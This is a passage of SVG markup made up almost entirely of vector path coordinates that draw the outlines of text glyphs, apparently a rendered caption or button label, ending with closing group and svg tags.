1-.328.848c-.155.25-.363.45-.624.6-.261.15-.584.224-.968.224s-.704-.075-.96-.224a1.747 1.747 0 0 1-.616-.6 2.579 2.579 0 0 1-.328-.848 4.845 4.845 0 0 1-.096-.968Zm-2.272 0c0 .661.101 1.259.304 1.792.203.533.49.99.864 1.368.373.379.821.67 1.344.872.523.203 1.11.304 1.76.304a4.9 4.9 0 0 0 1.768-.304 3.766 3.766 0 0 0 1.352-.872c.373-.379.661-.835.864-1.368.203-.533.304-1.13.304-1.792 0-.661-.101-1.261-.304-1.8a3.874 3.874 0 0 0-.864-1.376 3.856 3.856 0 0 0-1.352-.88 4.787 4.787 0 0 0-1.768-.312c-.65 0-1.237.104-1.76.312-.523.208-.97.501-1.344.88a3.874 3.874 0 0 0-.864 1.376 5.078 5.078 0 0 0-.304 1.8ZM333.936 317l2.608-8.272h-2.336l-1.52 5.6h-.032l-1.408-5.6h-2.208l-1.376 5.616h-.032l-1.52-5.616h-2.4l2.624 8.272h2.352l1.408-5.552h.032L331.6 317zM337.616 314.536V317h2.512v-2.464h-2.512Zm2.432-5.888v-3.072h-2.368v3.072l.608 4.928h1.136l.624-4.928ZM107.088 347.416h2.432a4.604 4.604 0 0 0-.544-1.76 4.28 4.28 0 0 0-1.096-1.288 4.83 4.83 0 0 0-1.504-.792 5.756 5.756 0 0 0-1.784-.272c-.875 0-1.661.155-2.36.464a5.048 5.048 0 0 0-1.768 1.28 5.707 5.707 0 0 0-1.104 1.912 7.138 7.138 0 0 0-.384 2.376 6.9 6.9 0 0 0 .384 2.328 5.56 5.56 0 0 0 1.104 1.88c.48.533 1.07.952 1.768 1.256.699.304 1.485.456 2.36.456.704 0 1.35-.107 1.936-.32a4.489 4.489 0 0 0 1.536-.928c.437-.405.79-.896 1.056-1.472a5.808 5.808 0 0 0 .496-1.936h-2.432c-.096.768-.36 1.387-.792 1.856-.432.47-1.032.704-1.8.704-.565 0-1.045-.11-1.44-.328a2.747 2.747 0 0 1-.96-.872 3.784 3.784 0 0 1-.536-1.224 5.815 5.815 0 0 1-.168-1.4c0-.501.056-.987.168-1.456.112-.47.29-.888.536-1.256.245-.368.565-.661.96-.88.395-.219.875-.328 1.44-.328a2.611 2.611 0 0 1 1.648.576c.224.181.41.392.56.632.15.24.245.504.288.792ZM111.152 343.576V355h2.272v-11.424zM117.552 345.448v-1.872h-2.272v1.872h2.272Zm-2.272 1.28V355h2.272v-8.272h-2.272ZM124.976 349.64h2.224c-.032-.533-.16-.995-.384-1.384a3.126 3.126 0 0 0-.872-.976 3.78 3.78 0 0 0-1.216-.584 5.186 5.186 0 0 0-1.416-.192c-.672 0-1.27.112-1.792.336a3.771 3.771 0 0 0-1.328.936c-.363.4-.637.875-.824 1.424a5.51 5.51 0 0 0-.28 1.784c0 .619.101 1.187.304 1.704.203.517.485.963.848 1.336.363.373.803.664 1.32.872a4.527 4.527 0 0 0 1.704.312c1.099 0 2-.288 2.704-.864.704-.576 1.13-1.413 1.28-2.512h-2.192c-.075.512-.259.92-.552 1.224-.293.304-.712.456-1.256.456-.352 0-.65-.08-.896-.24a1.792 1.792 0 0 1-.584-.616 2.821 2.821 0 0 1-.312-.84 4.494 4.494 0 0 1 0-1.848c.064-.315.173-.603.328-.864.155-.261.355-.475.6-.64.245-.165.55-.248.912-.248.97 0 1.53.475 1.68 1.424ZM128.736 343.576V355h2.272v-2.848l.88-.848L134.16 355h2.752l-3.472-5.232 3.12-3.04h-2.688l-2.864 2.976v-6.128zM144.432 348.712v-2.464h-1.056c0-.395.075-.728.224-1 .15-.272.427-.477.832-.616v-1.056a2.603 2.603 0 0 0-1.648.88c-.203.235-.36.507-.472.816-.112.31-.163.64-.152.992v2.448h2.272Zm3.408 0v-2.464h-1.056c0-.395.075-.728.224-1 .15-.272.427-.477.832-.616v-1.056a2.603 2.603 0 0 0-1.648.88c-.203.235-.36.507-.472.816-.112.31-.163.64-.152.992v2.448h2.272ZM155.12 355l3.792-11.424h-2.592l-2.576 8.032h-.032l-2.544-8.032h-2.576L152.288 355zM161.696 345.448v-1.872h-2.272v1.872h2.272Zm-2.272 1.28V355h2.272v-8.272h-2.272ZM169.056 349.976h-3.696c.01-.16.045-.341.104-.544a1.67 1.67 0 0 1 .88-1.032c.24-.123.541-.184.904-.184.555 0 .968.15 1.24.448.272.299.461.736.568 1.312Zm-3.696 1.44h5.968a5.84 5.84 0 0 0-.16-1.84 4.504 4.504 0 0 0-.728-1.568 3.672 3.672 0 0 0-1.288-1.096c-.523-.272-1.136-.408-1.84-.408-.63 0-1.203.112-1.72.336-.517.224-.963.53-1.336.92-.373.39-.661.85-.864 1.384a4.825 4.825 0 0 0-.304 1.728c0 .64.099 1.227.296 1.76.197.533.477.992.84 1.376.363.384.805.68 1.328.888.523.208 1.11.312 1.76.312.939 0 1.739-.213 2.4-.64.661-.427 1.152-1.136 1.472-2.128h-2c-.075.256-.277.499-.608.728-.33.23-.725.344-1.184.344-.64 0-1.13-.165-1.472-.496-.341-.33-.528-.864-.56-1.6ZM182.128 355l2.608-8.272H182.4l-1.52 5.6h-.032l-1.408-5.6h-2.208l-1.376 5.616h-.032l-1.52-5.616h-2.4l2.624 8.272h2.352l1.408-5.552h.032l1.472 5.552zM192.16 350.872c0-.33.032-.656.096-.976a2.49 2.49 0 0 1 .328-.848c.155-.245.36-.445.616-.6.256-.155.576-.232.96-.232s.707.077.968.232c.261.155.47.355.624.6.155.245.264.528.328.848a4.964 4.964 0 0 1 0 1.944 2.579 2.579 0 0 1-.328.848c-.155.25-.363.45-.624.6-.261.15-.584.224-.968.224s-.704-.075-.96-.224a1.747 1.747 0 0 1-.616-.6 2.579 2.579 0 0 1-.328-.848 4.845 4.845 0 0 1-.096-.968Zm-2.272 0c0 .661.101 1.259.304 1.792.203.533.49.99.864 1.368.373.379.821.67 1.344.872.523.203 1.11.304 1.76.304a4.9 4.9 0 0 0 1.768-.304 3.766 3.766 0 0 0 1.352-.872c.373-.379.661-.835.864-1.368.203-.533.304-1.13.304-1.792 0-.661-.101-1.261-.304-1.8a3.874 3.874 0 0 0-.864-1.376 3.856 3.856 0 0 0-1.352-.88 4.787 4.787 0 0 0-1.768-.312c-.65 0-1.237.104-1.76.312-.523.208-.97.501-1.344.88a3.874 3.874 0 0 0-.864 1.376 5.078 5.078 0 0 0-.304 1.8ZM199.92 346.728V355h2.272v-3.728c0-.373.037-.72.112-1.04.075-.32.2-.6.376-.84s.408-.43.696-.568c.288-.139.64-.208 1.056-.208a4.364 4.364 0 0 1 .816.08v-2.112a1.772 1.772 0 0 0-.496-.08c-.288 0-.565.043-.832.128a3.049 3.049 0 0 0-.752.36 2.83 2.83 0 0 0-1.056 1.272h-.032v-1.536h-2.16ZM208.48 345.448v-1.872h-2.272v1.872h2.272Zm-2.272 1.28V355h2.272v-8.272h-2.272ZM214.128 353.048c-.352 0-.645-.075-.88-.224a1.776 1.776 0 0 1-.568-.576 2.4 2.4 0 0 1-.304-.792 4.517 4.517 0 0 1-.088-.888c0-.31.035-.605.104-.888.07-.283.181-.533.336-.752.155-.219.347-.392.576-.52.23-.128.504-.192.824-.192.373 0 .683.07.928.208.245.139.443.325.592.56.15.235.256.504.32.808.064.304.096.627.096.968 0 .299-.04.584-.12.856-.08.272-.2.515-.36.728-.16.213-.363.384-.608.512a1.807 1.807 0 0 1-.848.192Zm4.096 1.424v-7.744h-2.16v1.104h-.032c-.277-.48-.621-.821-1.032-1.024-.41-.203-.888-.304-1.432-.304-.576 0-1.085.112-1.528.336a3.286 3.286 0 0 0-1.112.904 4.036 4.036 0 0 0-.68 1.312 5.156 5.156 0 0 0-.232 1.544c0 .565.067 1.101.2 1.608.133.507.344.95.632 1.328.288.379.656.677 1.104.896.448.219.981.328 1.6.328.501 0 .979-.104 1.432-.312a2.25 2.25 0 0 0 1.048-.968h.032v1.088c.01.587-.13 1.072-.424 1.456-.293.384-.76.576-1.4.576a2.24 2.24 0 0 1-1.072-.248c-.31-.165-.517-.461-.624-.888h-2.256c.032.47.163.872.392 1.208.23.336.517.61.864.824.347.213.73.37 1.152.472.421.101.835.152 1.24.152.95 0 1.707-.128 2.272-.384.565-.256.997-.568 1.296-.936.299-.368.493-.765.584-1.192.09-.427.136-.805.136-1.136ZM222.384 345.448v-1.872h-2.272v1.872h2.272Zm-2.272 1.28V355h2.272v-8.272h-2.272ZM224.176 346.728V355h2.272v-4.336c0-.843.139-1.448.416-1.816.277-.368.725-.552 1.344-.552.544 0 .923.168 1.136.504.213.336.32.845.32 1.528V355h2.272v-5.088c0-.512-.045-.979-.136-1.4a2.663 2.663 0 0 0-.472-1.072 2.218 2.218 0 0 0-.92-.688c-.39-.165-.888-.248-1.496-.248-.48 0-.95.11-1.408.328-.459.219-.832.568-1.12 1.048h-.048v-1.152h-2.16ZM233.568 349.272c.032-.533.165-.976.4-1.328.235-.352.533-.635.896-.848.363-.213.77-.365 1.224-.456.453-.09.91-.136 1.368-.136.416 0 .837.03 1.264.088.427.059.816.173 1.168.344.352.17.64.408.864.712.224.304.336.707.336 1.208v4.304c0 .373.021.73.064 1.072.043.341.117.597.224.768h-2.304a3.26 3.26 0 0 1-.16-.8 2.96 2.96 0 0 1-1.28.784c-.49.15-.992.224-1.504.224-.395 0-.763-.048-1.104-.144a2.528 2.528 0 0 1-.896-.448 2.085 2.085 0 0 1-.6-.768c-.144-.31-.216-.677-.216-1.104 0-.47.083-.856.248-1.16.165-.304.379-.547.64-.728.261-.181.56-.317.896-.408.336-.09.675-.163 1.016-.216.341-.053.677-.096 1.008-.128.33-.032.624-.08.88-.144.256-.064.459-.157.608-.28.15-.123.219-.301.208-.536 0-.245-.04-.44-.12-.584a.882.882 0 0 0-.32-.336 1.259 1.259 0 0 0-.464-.16 3.797 3.797 0 0 0-.568-.04c-.448 0-.8.096-1.056.288-.256.192-.405.512-.448.96h-2.272Zm5.248 1.68a1.02 1.02 0 0 1-.36.2 3.677 3.677 0 0 1-.464.12 7.11 7.11 0 0 1-.52.08 9.552 9.552 0 0 0-.544.08c-.17.032-.339.075-.504.128a1.49 1.49 0 0 0-.432.216c-.123.09-.221.205-.296.344a1.107 1.107 0 0 0-.112.528c0 .203.037.373.112.512a.859.859 0 0 0 .304.328c.128.08.277.136.448.168.17.032.347.048.528.048.448 0 .795-.075 1.04-.224.245-.15.427-.328.544-.536.117-.208.19-.419.216-.632.027-.213.04-.384.04-.512v-.848ZM242.912 343.576V355h2.272v-11.424zM251.488 346.728V355h2.272v-4.8c0-.405.059-.733.176-.984.117-.25.259-.443.424-.576.165-.133.336-.224.512-.272.176-.048.317-.072.424-.072.363 0 .637.061.824.184.187.123.32.285.4.488.08.203.125.424.136.664.01.24.016.483.016.728V355h2.272v-4.608c0-.256.019-.51.056-.76.037-.25.112-.475.224-.672.112-.197.267-.357.464-.48s.456-.184.776-.184.573.053.76.16c.187.107.328.25.424.432.096.181.155.395.176.64.021.245.032.507.032.784V355h2.272v-5.536c0-.533-.075-.99-.224-1.368a2.345 2.345 0 0 0-.624-.92 2.448 2.448 0 0 0-.96-.512 4.412 4.412 0 0 0-1.216-.16c-.576 0-1.075.139-1.496.416a3.521 3.521 0 0 0-1 .96c-.224-.512-.552-.87-.984-1.072a3.33 3.33 0 0 0-1.432-.304c-.544 0-1.027.117-1.448.352a3.235 3.235 0 0 0-1.08.992h-.032v-1.12h-2.144ZM271.488 349.976h-3.696c.01-.16.045-.341.104-.544a1.67 1.67 0 0 1 .88-1.032c.24-.123.541-.184.904-.184.555 0 .968.15 1.24.448.272.299.461.736.568 1.312Zm-3.696 1.44h5.968a5.84 5.84 0 0 0-.16-1.84 4.504 4.504 0 0 0-.728-1.568 3.672 3.672 0 0 0-1.288-1.096c-.523-.272-1.136-.408-1.84-.408-.63 0-1.203.112-1.72.336-.517.224-.963.53-1.336.92-.373.39-.661.85-.864 1.384a4.824 4.824 0 0 0-.304 1.728c0 .64.099 1.227.296 1.76.197.533.477.992.84 1.376.363.384.805.68 1.328.888.523.208 1.11.312 1.76.312.939 0 1.739-.213 2.4-.64.661-.427 1.152-1.136 1.472-2.128h-2c-.075.256-.277.499-.608.728-.33.23-.725.344-1.184.344-.64 0-1.13-.165-1.472-.496-.341-.33-.528-.864-.56-1.6ZM280.976 350.84c0 .341-.032.672-.096.992-.064.32-.17.605-.32.856-.15.25-.35.45-.6.6-.25.15-.563.224-.936.224-.352 0-.653-.077-.904-.232a1.996 1.996 0 0 1-.624-.608 2.622 2.622 0 0 1-.36-.856 4.212 4.212 0 0 1-.112-.96c0-.341.035-.67.104-.984.07-.315.181-.595.336-.84.155-.245.36-.443.616-.592.256-.15.57-.224.944-.224.373 0 .683.075.928.224.245.15.445.344.6.584.155.24.264.517.328.832.064.315.096.643.096.984Zm.032 3.104V355h2.16v-11.424h-2.272v4.16h-.032a2.439 2.439 0 0 0-1.048-.92 3.253 3.253 0 0 0-1.4-.312c-.608 0-1.141.12-1.6.36a3.43 3.43 0 0 0-1.144.952 4.18 4.18 0 0 0-.688 1.368 5.583 5.583 0 0 0-.232 1.608c0 .576.077 1.13.232 1.664a4.43 4.43 0 0 0 .688 1.416c.304.41.69.736 1.16.976s1.013.36 1.632.36c.544 0 1.032-.099 1.464-.296.432-.197.781-.52 1.048-.968h.032ZM287.216 345.448v-1.872h-2.272v1.872h2.272Zm-2.272 1.28V355h2.272v-8.272h-2.272ZM288.912 349.272c.032-.533.165-.976.4-1.328.235-.352.533-.635.896-.848.363-.213.77-.365 1.224-.456.453-.09.91-.136 1.368-.136.416 0 .837.03 1.264.088.427.059.816.173 1.168.344.352.17.64.408.864.712.224.304.336.707.336 1.208v4.304c0 .373.021.73.064 1.072.043.341.117.597.224.768h-2.304a3.26 3.26 0 0 1-.16-.8 2.96 2.96 0 0 1-1.28.784c-.49.15-.992.224-1.504.224-.395 0-.763-.048-1.104-.144a2.528 2.528 0 0 1-.896-.448 2.085 2.085 0 0 1-.6-.768c-.144-.31-.216-.677-.216-1.104 0-.47.083-.856.248-1.16.165-.304.379-.547.64-.728.261-.181.56-.317.896-.408.336-.09.675-.163 1.016-.216.341-.053.677-.096 1.008-.128.33-.032.624-.08.88-.144.256-.064.459-.157.608-.28.15-.123.219-.301.208-.536 0-.245-.04-.44-.12-.584a.882.882 0 0 0-.32-.336 1.259 1.259 0 0 0-.464-.16 3.797 3.797 0 0 0-.568-.04c-.448 0-.8.096-1.056.288-.256.192-.405.512-.448.96h-2.272Zm5.248 1.68a1.02 1.02 0 0 1-.36.2 3.677 3.677 0 0 1-.464.12 7.11 7.11 0 0 1-.52.08 9.552 9.552 0 0 0-.544.08c-.17.032-.339.075-.504.128a1.49 1.49 0 0 0-.432.216c-.123.09-.221.205-.296.344a1.107 1.107 0 0 0-.112.528c0 .203.037.373.112.512a.859.859 0 0 0 .304.328c.128.08.277.136.448.168.17.032.347.048.528.048.448 0 .795-.075 1.04-.224.245-.15.427-.328.544-.536.117-.208.19-.419.216-.632.027-.213.04-.384.04-.512v-.848ZM298.192 343.576v2.464h1.056c0 .395-.075.728-.224 1-.15.272-.427.477-.832.616v1.056a2.603 2.603 0 0 0 1.648-.88c.203-.235.36-.507.472-.816.112-.31.163-.64.152-.992v-2.448h-2.272Zm3.408 0v2.464h1.056c0 .395-.075.728-.224 1-.15.272-.427.477-.832.616v1.056a2.603 2.603 0 0 0 1.648-.88c.203-.235.36-.507.472-.816.112-.31.163-.64.152-.992v-2.448H301.6ZM310.544 348.248V355h2.272v-6.752h1.568v-1.52h-1.568v-.496c0-.341.067-.584.2-.728.133-.144.355-.216.664-.216.288 0 .565.016.832.048v-1.696c-.192-.01-.39-.024-.592-.04a7.722 7.722 0 0 0-.608-.024c-.928 0-1.621.235-2.08.704-.459.47-.688 1.072-.688 1.808v.64h-1.36v1.52h1.36ZM317.392 350.872c0-.33.032-.656.096-.976a2.49 2.49 0 0 1 .328-.848c.155-.245.36-.445.616-.6.256-.155.576-.232.96-.232s.707.077.968.232c.261.155.47.355.624.6.155.245.264.528.328.848a4.964 4.964 0 0 1 0 1.944 2.579 2.579 0 0 1-.328.848c-.155.25-.363.45-.624.6-.261.15-.584.224-.968.224s-.704-.075-.96-.224a1.747 1.747 0 0 1-.616-.6 2.579 2.579 0 0 1-.328-.848 4.845 4.845 0 0 1-.096-.968Zm-2.272 0c0 .661.101 1.259.304 1.792.203.533.49.99.864 1.368.373.379.821.67 1.344.872.523.203 1.11.304 1.76.304a4.9 4.9 0 0 0 1.768-.304 3.766 3.766 0 0 0 1.352-.872c.373-.379.661-.835.864-1.368.203-.533.304-1.13.304-1.792 0-.661-.101-1.261-.304-1.8a3.874 3.874 0 0 0-.864-1.376 3.856 3.856 0 0 0-1.352-.88 4.787 4.787 0 0 0-1.768-.312c-.65 0-1.237.104-1.76.312-.523.208-.97.501-1.344.88a3.874 3.874 0 0 0-.864 1.376 5.078 5.078 0 0 0-.304 1.8ZM325.152 346.728V355h2.272v-3.728c0-.373.037-.72.112-1.04.075-.32.2-.6.376-.84s.408-.43.696-.568c.288-.139.64-.208 1.056-.208a4.364 4.364 0 0 1 .816.08v-2.112a1.772 1.772 0 0 0-.496-.08c-.288 0-.565.043-.832.128a3.049 3.049 0 0 0-.752.36 2.83 2.83 0 0 0-1.056 1.272h-.032v-1.536h-2.16ZM338.704 346.728v-2.48h-2.272v2.48h-1.376v1.52h1.376v4.88c0 .416.07.752.208 1.008.139.256.328.453.568.592.24.139.517.232.832.28.315.048.648.072 1 .072.224 0 .453-.005.688-.016.235-.01.448-.032.64-.064v-1.76a3.183 3.183 0 0 1-.336.048c-.117.01-.24.016-.368.016-.384 0-.64-.064-.768-.192s-.192-.384-.192-.768v-4.096h1.664v-1.52h-1.664ZM341.456 343.576V355h2.272v-4.336c0-.843.139-1.448.416-1.816.277-.368.725-.552 1.344-.552.544 0 .923.168 1.136.504.213.336.32.845.32 1.528V355h2.272v-5.088c0-.512-.045-.979-.136-1.4a2.663 2.663 0 0 0-.472-1.072 2.218 2.218 0 0 0-.92-.688c-.39-.165-.888-.248-1.496-.248-.427 0-.864.11-1.312.328-.448.219-.816.568-1.104 1.048h-.048v-4.304h-2.272ZM356.512 349.976h-3.696c.01-.16.045-.341.104-.544a1.67 1.67 0 0 1 .88-1.032c.24-.123.541-.184.904-.184.555 0 .968.15 1.24.448.272.299.461.736.568 1.312Zm-3.696 1.44h5.968a5.84 5.84 0 0 0-.16-1.84 4.504 4.504 0 0 0-.728-1.568 3.672 3.672 0 0 0-1.288-1.096c-.523-.272-1.136-.408-1.84-.408-.63 0-1.203.112-1.72.336-.517.224-.963.53-1.336.92-.373.39-.661.85-.864 1.384a4.824 4.824 0 0 0-.304 1.728c0 .64.099 1.227.296 1.76.197.533.477.992.84 1.376.363.384.805.68 1.328.888.523.208 1.11.312 1.76.312.939 0 1.739-.213 2.4-.64.661-.427 1.152-1.136 1.472-2.128h-2c-.075.256-.277.499-.608.728-.33.23-.725.344-1.184.344-.64 0-1.13-.165-1.472-.496-.341-.33-.528-.864-.56-1.6ZM370.208 349.64h2.224c-.032-.533-.16-.995-.384-1.384a3.126 3.126 0 0 0-.872-.976 3.78 3.78 0 0 0-1.216-.584 5.186 5.186 0 0 0-1.416-.192c-.672 0-1.27.112-1.792.336a3.771 3.771 0 0 0-1.328.936c-.363.4-.637.875-.824 1.424a5.51 5.51 0 0 0-.28 1.784c0 .619.101 1.187.304 1.704.203.517.485.963.848 1.336.363.373.803.664 1.32.872a4.527 4.527 0 0 0 1.704.312c1.099 0 2-.288 2.704-.864.704-.576 1.13-1.413 1.28-2.512h-2.192c-.075.512-.259.92-.552 1.224-.293.304-.712.456-1.256.456-.352 0-.65-.08-.896-.24a1.793 1.793 0 0 1-.584-.616 2.821 2.821 0 0 1-.312-.84 4.494 4.494 0 0 1 0-1.848c.064-.315.173-.603.328-.864.155-.261.355-.475.6-.64.245-.165.55-.248.912-.248.97 0 1.53.475 1.68 1.424ZM375.776 350.872c0-.33.032-.656.096-.976a2.49 2.49 0 0 1 .328-.848c.155-.245.36-.445.616-.6.256-.155.576-.232.96-.232s.707.077.968.232c.261.155.47.355.624.6.155.245.264.528.328.848a4.964 4.964 0 0 1 0 1.944 2.579 2.579 0 0 1-.328.848c-.155.25-.363.45-.624.6-.261.15-.584.224-.968.224s-.704-.075-.96-.224a1.747 1.747 0 0 1-.616-.6 2.579 2.579 0 0 1-.328-.848 4.845 4.845 0 0 1-.096-.968Zm-2.272 0c0 .661.101 1.259.304 1.792.203.533.49.99.864 1.368.373.379.821.67 1.344.872.523.203 1.11.304 1.76.304a4.9 4.9 0 0 0 1.768-.304 3.766 3.766 0 0 0 1.352-.872c.373-.379.661-.835.864-1.368.203-.533.304-1.13.304-1.792 0-.661-.101-1.261-.304-1.8a3.874 3.874 0 0 0-.864-1.376 3.856 3.856 0 0 0-1.352-.88 4.787 4.787 0 0 0-1.768-.312c-.65 0-1.237.104-1.76.312-.523.208-.97.501-1.344.88a3.874 3.874 0 0 0-.864 1.376 5.078 5.078 0 0 0-.304 1.8ZM389.408 350.84c0 .341-.032.672-.096.992-.064.32-.17.605-.32.856-.15.25-.35.45-.6.6-.25.15-.563.224-.936.224-.352 0-.653-.077-.904-.232a1.996 1.996 0 0 1-.624-.608 2.622 2.622 0 0 1-.36-.856 4.212 4.212 0 0 1-.112-.96c0-.341.035-.67.104-.984.07-.315.181-.595.336-.84.155-.245.36-.443.616-.592.256-.15.57-.224.944-.224.373 0 .683.075.928.224.245.15.445.344.6.584.155.24.264.517.328.832.064.315.096.643.096.984Zm.032 3.104V355h2.16v-11.424h-2.272v4.16h-.032a2.439 2.439 0 0 0-1.048-.92 3.253 3.253 0 0 0-1.4-.312c-.608 0-1.141.12-1.6.36a3.43 3.43 0 0 0-1.144.952 4.18 4.18 0 0 0-.688 1.368 5.583 5.583 0 0 0-.232 1.608c0 .576.077 1.13.232 1.664a4.43 4.43 0 0 0 .688 1.416c.304.41.69.736 1.16.976s1.013.36 1.632.36c.544 0 1.032-.099 1.464-.296.432-.197.781-.52 1.048-.968h.032ZM398.88 349.976h-3.696c.01-.16.045-.341.104-.544a1.67 1.67 0 0 1 .88-1.032c.24-.123.541-.184.904-.184.555 0 .968.15 1.24.448.272.299.461.736.568 1.312Zm-3.696 1.44h5.968a5.84 5.84 0 0 0-.16-1.84 4.504 4.504 0 0 0-.728-1.568 3.672 3.672 0 0 0-1.288-1.096c-.523-.272-1.136-.408-1.84-.408-.63 0-1.203.112-1.72.336-.517.224-.963.53-1.336.92-.373.39-.661.85-.864 1.384a4.824 4.824 0 0 0-.304 1.728c0 .64.099 1.227.296 1.76.197.533.477.992.84 1.376.363.384.805.68 1.328.888.523.208 1.11.312 1.76.312.939 0 1.739-.213 2.4-.64.661-.427 1.152-1.136 1.472-2.128h-2c-.075.256-.277.499-.608.728-.33.23-.725.344-1.184.344-.64 0-1.13-.165-1.472-.496-.341-.33-.528-.864-.56-1.6Z"/></g></g></svg>